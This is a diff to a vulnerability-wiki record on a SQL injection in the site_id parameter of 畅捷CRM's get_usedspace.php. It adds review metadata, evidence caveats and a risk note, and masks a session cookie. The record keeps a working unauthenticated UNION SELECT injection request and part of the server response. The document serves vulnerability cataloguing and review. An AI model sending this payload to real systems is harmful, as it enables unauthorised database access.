@@ -1,11 +1,51 @@
 ---
-fofa: "搜索语句"
 source: "MrWQ/vulnerability-paper"
+title: "畅捷CRM get_usedspace site_id SQL 注入"
+product: "畅捷CRM"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "Windows8.3短路径/MySQL语法；版本未知"
+prerequisites: "无Cookie请求"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/MW9WSSaye8ARGXICBTqoxw"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/0day%20%E7%95%85%E6%8D%B7%20CRM/0day%20%E7%95%85%E6%8D%B7%20CRM%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
+fofa_unverified: "搜索语句"
+id: "vw-5ba87ad96e41b4448cae6933"
+entity_id: "ve-5ba87ad96e41b4448cae6933"
+schema_version: "1"
 ---
 
-# 【0day】畅捷 CRM SQL 注入漏洞复现
+# 畅捷CRM get_usedspace site_id SQL 注入
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：畅捷CRM；get_usedspace site_id SQLi
+- 版本、配置及部署条件：Windows8.3短路径/MySQL语法；版本未知
+- 认证与权限前提：无Cookie请求
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 有原始请求及对应CONCAT回显，证据比单截图完整；尚未独立验证
+- 0day需历史日期，目录不应以0day做产品名；fofa误抽搜索语句
+- MD5解密即可明文表述错误，破解不保证成功；SQLi不直接等于系统控制
+- 脚本硬编码Windows输入路径、固定标记易重放且关闭TLS验证，保留静态审计而非推荐运行；缺厂商补丁
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MW9WSSaye8ARGXICBTqoxw)
 
 免责申明：**本文仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责！！！**
@@ -35,7 +75,7 @@ title="畅捷CRM"
 
 向目标发送如下请求数据包  
 
-```
+```http
 GET /WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)-- HTTP/1.1
 Host: x.x.x.x
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69
@@ -53,7 +93,7 @@ HTTP/1.1 200 OK
 Date: Fri, 15 Sep 2023 10:09:33 GMT
 Server: Apache/2.2.6 (Win32) PHP/5.2.10
 X-Powered-By: PHP/5.2.10
-Set-Cookie: PHPSESSID=79c6ba39448dd8a73c3c2a9f85a07173; path=/
+Set-Cookie: PHPSESSID=7******************************3; path=/
 Expires: Thu, 19 Nov 1981 08:52:00 GMT
 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
 Pragma: no-cache
